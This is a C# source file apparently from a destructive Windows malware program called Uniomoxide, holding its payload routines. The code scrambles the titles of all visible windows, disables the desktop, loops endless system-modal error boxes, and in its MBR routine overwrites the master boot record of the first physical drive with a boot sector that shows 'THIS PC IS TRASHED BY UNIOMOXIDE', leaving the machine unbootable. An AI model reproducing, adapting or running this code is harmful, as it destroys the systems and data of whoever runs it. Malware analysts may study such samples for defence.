using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Uniomoxide
{
    internal class payloads
    {
        public static Random r = new Random();

        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);

        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern int GetWindowTextW(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern bool EnumChildWindows(IntPtr hWndParent, EnumChildProc lpEnumFunc, IntPtr lParam);
        private delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern bool SetWindowTextW(IntPtr hWnd, string lpString);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, long uType);

        [DllImport("user32.dll")]
        static extern int GetWindowTextLengthW(IntPtr hWnd);

        [DllImport("user32.dll")]

        static extern int EnableWindow(IntPtr hWnd, bool bEnable);

        public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

        private const uint MOUSEEVENTF_LEFTDOWN = 0x02;
        private const uint MOUSEEVENTF_LEFTUP = 0x04;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const uint MOUSEEVENTF_RIGHTUP = 0x10;

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberBytesWritten, IntPtr lpOverlapped);
        [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
        [DllImport("user32.dll", EntryPoint = "GetWindowLongPtrW")] static extern IntPtr GetWindowLongPtr(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll", EntryPoint = "SetWindowLongPtrW")] static extern IntPtr SetWindowLongPtr(IntPtr hWnd, int nIndex, IntPtr dwNewLong);
        [DllImport("user32.dll")] static extern IntPtr CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, int uType);

        [DllImport("user32.dll")] static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("user32.dll")] static extern int FillRect(IntPtr hDC, ref RECT lprc, IntPtr hbr);

        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")] static extern bool GetClientRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")] static extern IntPtr SetWindowsHookExW(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;

        const int WH_CBT = 5;
        const int HCBT_ACTIVATE = 5;
        const int WM_PAINT = 0x000F;
        const int GWL_WNDPROC = -4;

        const int MB_ICONERROR = 0x10;
        const int MB_SYSTEMMODAL = 0x1000;

        static IntPtr hHook;
        static HookProc hook;
        static WndProc wnd;
        static IntPtr oldProc;
        static Random rnd = new Random();

        delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
        delegate IntPtr WndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        struct RECT { public int left, top, right, bottom; }

        public static string get_unicode(int amount)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < amount; i++)
            {
                int codepoint;
                do
                {
                    codepoint = r.Next(0x20, 0xFF);
                }
                while (char.IsControl((char)codepoint));
                sb.Append(char.ConvertFromUtf32(codepoint));
            }

            return sb.ToString();
        }

        public static void randomize_window_titles()
        {
            EnumWindows((hWnd, lParam) =>
            {
                if (IsWindowVisible(hWnd))
                {
                    int length = GetWindowTextLength(hWnd);
                    StringBuilder sb = new StringBuilder(length + 1);
                    GetWindowTextW(hWnd, sb, sb.Capacity);
                    string title = sb.ToString();
                    if (!string.IsNullOrEmpty(title))
                    {
                        SetWindowTextW(hWnd, get_unicode(r.Next(5, 20)));
                    }
                }
                return true;
            }, IntPtr.Zero);
        }

        public static void randomize_desktop()
        {
            IntPtr desktopHandle = GetDesktopWindow();
            EnumChildWindows(desktopHandle, (hWnd, lParam) =>
            {
                if (IsWindowVisible(hWnd))
                {
                    int length = GetWindowTextLength(hWnd);
                    StringBuilder sb = new StringBuilder(length + 1);
                    GetWindowTextW(hWnd, sb, sb.Capacity);
                    string title = sb.ToString();
                    if (!string.IsNullOrEmpty(title))
                    {
                        SetWindowTextW(hWnd, get_unicode(r.Next(5, 20)));
                    }
                }
                return true;
            }, IntPtr.Zero);
        }

        static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode == HCBT_ACTIVATE)
            {
                IntPtr hwnd = wParam;
                wnd = SubclassProc;
                oldProc = GetWindowLongPtr(hwnd, GWL_WNDPROC);
                SetWindowLongPtr(hwnd, GWL_WNDPROC, Marshal.GetFunctionPointerForDelegate(wnd));
                return IntPtr.Zero;
            }
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        static IntPtr SubclassProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
        {
            if (msg == WM_PAINT)
            {
                IntPtr hdc = GetDC(hWnd);
                GetClientRect(hWnd, out RECT rc);
                IntPtr brush = GetDC(hWnd);
                FillRect(hdc, ref rc, brush);
                ReleaseDC(hWnd, hdc);
                return IntPtr.Zero;
            }
            return CallWindowProc(oldProc, hWnd, msg, wParam, lParam);
        }

        public static void Unknownerror()
        {
            IntPtr desktop = GetDesktopWindow();
            EnableWindow(desktop, false);
            hook = HookCallback;
            while (true)
            {
                hHook = SetWindowsHookExW(WH_CBT, hook, IntPtr.Zero, GetCurrentThreadId());
                string text = get_unicode(100);
                string title = get_unicode(20);
                UnhookWindowsHookEx(hHook);
                MessageBoxW(IntPtr.Zero, text, title, MB_ICONERROR | MB_SYSTEMMODAL);
            }
        }

        public static void Unknownerror2()
        {
            IntPtr desktop = GetDesktopWindow();
            EnableWindow(desktop, false);
            hook = HookCallback;
            while (true)
            {
                hHook = SetWindowsHookExW(WH_CBT, hook, IntPtr.Zero, GetCurrentThreadId());
                string text = get_unicode2(20);
                string title = get_unicode2(20);
                MessageBoxW(IntPtr.Zero, text, title, MB_ICONERROR | MB_SYSTEMMODAL);
                UnhookWindowsHookEx(hHook);
            }
        }


        static string get_unicode2(int len)
        {
            StringBuilder sb = new StringBuilder(len);
            for (int i = 0; i < len; i++)
                sb.Append((char)(0x4E00 + (i % 200)));
            return sb.ToString();
        }

        public static void EnumAndMatch(IntPtr parent)
        {
            string target = get_unicode2(100);

            EnumChildWindows(parent, (hwnd, l) =>
            {
                int length = GetWindowTextLengthW(hwnd);
                if (length > 0)
                {
                    StringBuilder sb = new StringBuilder(length + 1);
                    GetWindowTextW(hwnd, sb, sb.Capacity);
                    string title = sb.ToString();

                    if (title == target)
                        Console.WriteLine(hwnd);
                }
                return true;
            }, IntPtr.Zero);
        }

        public static void MBR()
        {
            var mbrData = new byte[] {0xEB, 0x31, 0x01, 0x00, 0x00, 0x00, 0x54, 0x48, 0x49, 0x53, 0x20, 0x50, 0x43, 0x20, 0x49, 0x53,
0x20, 0x54, 0x52, 0x41, 0x53, 0x48, 0x45, 0x44, 0x20, 0x42, 0x59, 0x20, 0x55, 0x4E, 0x49, 0x4F,
0x4D, 0x4F, 0x58, 0x49, 0x44, 0x45, 0x20, 0x45, 0x6E, 0x6A, 0x6F, 0x79, 0x20, 0x28, 0x3A, 0x00,
0x00, 0x00, 0x00, 0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0xFB,
0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB4, 0x00, 0xCD, 0x1A, 0x89, 0x16, 0x04, 0x7C, 0x89, 0x16, 0x02,
0x7C, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xE8, 0x80, 0x00, 0x88, 0xE0,
0xAA, 0xE2, 0xF8, 0xB4, 0x00, 0xCD, 0x1A, 0x89, 0xD0, 0x2B, 0x06, 0x04, 0x7C, 0x83, 0xF8, 0x36,
0x72, 0xDF, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB0, 0x0D, 0xB9, 0x00, 0xFA, 0xF3, 0xAA,
0xBE, 0x06, 0x7C, 0xE8, 0x58, 0x00, 0xA1, 0x02, 0x7C, 0x83, 0xE0, 0x0F, 0x74, 0x00, 0xA2, 0x30,
0x7C, 0xE8, 0x4A, 0x00, 0xA1, 0x02, 0x7C, 0x31, 0xD2, 0xB9, 0x40, 0x01, 0xF7, 0xF1, 0xC1, 0xEA,
0x03, 0x88, 0x16, 0x31, 0x7C, 0xE8, 0x36, 0x00, 0xA1, 0x02, 0x7C, 0x31, 0xD2, 0xB9, 0xC8, 0x00,
0xF7, 0xF1, 0xC1, 0xEA, 0x03, 0x88, 0x16, 0x32, 0x7C, 0xB4, 0x02, 0xB7, 0x00, 0x8A, 0x36, 0x32,
0x7C, 0x8A, 0x16, 0x31, 0x7C, 0xCD, 0x10, 0xB4, 0x0E, 0xB7, 0x00, 0x8A, 0x1E, 0x30, 0x7C, 0x89,
0xF7, 0x8A, 0x05, 0x3C, 0x00, 0x74, 0x05, 0xCD, 0x10, 0x47, 0xEB, 0xF5, 0xEB, 0xA2, 0xA1, 0x02,
0x7C, 0xBA, 0x35, 0x4E, 0xF7, 0xE2, 0x05, 0x5A, 0x01, 0xA3, 0x02, 0x7C, 0xC3, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                 OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}

